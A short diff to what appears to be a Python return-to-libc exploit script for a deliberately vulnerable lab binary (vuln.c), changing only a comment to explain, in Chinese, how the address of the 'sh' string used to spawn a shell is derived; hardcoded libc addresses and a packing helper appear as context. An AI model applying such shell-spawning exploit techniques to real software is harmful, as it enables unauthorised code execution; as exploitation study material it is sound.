@@ -84,7 +84,7 @@ exit = 0xb7e54be0          #0xb7e2000+0x00032be0
 #system_arg points to 'sh' substring of 'fflush' string. 
 #To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. 
 #But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!
-system_arg = 0x804827d     #(obtained from hexdump output of the binary)
+system_arg = 0x804827d     #(obtained from hexdump output of the binary，文件字符串地址+program header加载到内存时固定偏移地址)
 #endianess conversion
 def conv(num):
  return struct.pack("<I",num)
